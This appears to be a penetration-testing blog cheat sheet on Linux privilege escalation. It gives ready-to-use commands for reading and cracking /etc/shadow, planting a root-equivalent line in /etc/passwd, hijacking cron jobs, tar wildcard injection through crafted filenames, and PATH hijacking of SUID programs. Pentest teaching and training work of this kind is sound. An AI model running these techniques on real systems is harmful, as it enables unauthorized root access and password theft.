---
template: overrides/author.html
title: Linux Privilege Escalation
---

<aside class="mdx-author" markdown>
![@squidfunk][@squidfunk avatar]

<span>__suhao__ · @h40huynh</span>
<span>
:octicons-calendar-24: Aug 19, 2022 ·
:octicons-clock-24: 3 min read
</span>
</aside>

  [built-in search plugin]: ../../setup/setting-up-site-search.md#built-in-search-plugin
  [@squidfunk avatar]: ../assets/author/haoicon.png
  [insiders-4.14.0]: ../../insiders/changelog.md#4.14.0

---

!!! note
    It is not always possible to escalate privileges to root, we have to escalate privileges to another non-root user, then escalate privileges to root

## Enumerate Basic information

Get current user context and hostname

```bash
id && hostname
```

## Service Exploits

Enumerate running proccess

```bash
ps aux
ps aux | grep root
```

Enumerate binding ports

```bash
netstat -ano
```

```bash
ss -anp
```

## Weak File Permissions

### /etc/shadow

!!! info
    The /etc/shadow file contains user password hashes

Get /etc/shadow permissions

```bash
ls -l /etc/shadow
```

#### Readable /etc/shadow

```bash
cat /etc/shadow
```

Save the root user (or someone you want to privilege escalate to) to a file and use `john` to crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Finally, switch user with cracked password

```bash
su root
```

#### Writable /etc/shadow

Generate a new password:

```bash
mkpasswd -m sha-512 newpassword
```

Edit the /etc/shadow file and replace the root password hash. Finally, switch user with new password. Here is the empty password hash

```
root:$6$1.kHoCdgGLxINgw$TQbdEgrYcctS4/o7EKtmWaxwBoOHaeU2nK4B66Any.4ksSyb5FFedubBtSs.Rc9DkxD02ju7RfK/I0U8MXdb50:17298:0:99999:7:::
```

### Writable /etc/passwd

!!! info
    The /etc/passwd file contains information about user accounts. It usually only readable.


Get /etc/passwd permissions

```bash
ls -l /etc/passwd
```

Generate a new password

```bash
openssl passwd newpassword
```

Then, copy the root user row, replace username with and the "x" field with the new password to create new root user. Here is a new user with username is `lithonn` and password is empty (empty not "empty")

```
lithonn:lF/bBdY9ikuzY:0:0:root:/root:/bin/bash
```

## Sudo

!!! info
    The `sudo` command allows user to run a program with root privileges. In some cases you may have permission to run some commands with sudo privileges without a password.

```bash
sudo -l
```

!!! warning
    Use the same command as in the output of the `sudo -l` command, without shortening.

## Cron Jobs

!!! info
    Cron jobs are programs/scripts run at specific times or interval.

```bash
ls -lah /etc/cron*
```

```bash
cat /etc/crontab
```

### File permissions

The cron job script can be modify by non owner user. Depending on the situation, we ca replace the script with:

- Our reverse shell
- Set SUID for /bin/bash (or other program)
- Change/Create root user
- ...

### PATH Environment Variable

Look for PATH variable in `/etc/crontab`

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

...
```

Then, check the permission on `/home/user`, if have write permssion, replace the cron job execute script.

### Wildcards injection

Backup scripts often use `tar` to create compress files. If using tar with wildard (*), wildcard injection technique can be used to exploit.

Create 2 files with names: `--checkpoint=1` and `--checkpoint-action=exec=shell.elf`

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

Wait for cron job to compress files. The tar command will interpret files `--checkpoint=1` and `--checkpoint-action=exec=shell.elf` as 2 options instead of file names.

See more exploits at https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks

!!! note
    Can use this exploit with SUID


## SUID/SGID

The SUID/SGID allows files to be executed with the permission level of the file owner or the group owner.

Enumerate for SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

### SUID Known Exploits

See how to exploit on [GTFOBins](https://gtfobins.github.io) and [ExploitDB](https://www.exploit-db.com/)

### SUID Environment variables

Use `strings` to look for relative path program. Example: call `service` instead of `/usr/bin/service`

```bash
strings /usr/bin/suidprogram
```

Then, create a fake program

```bash
echo "bash -p" > /tmp/service
```

Add /tmp to `$PATH`

```bash
export PATH=/tmp:$PATH
```

Finally, run the SUID

## NFS

## Kernel exploit

```bash
uname -a
```

```bash
cat /etc/issue
```

```bash
cat /etc/*-release
```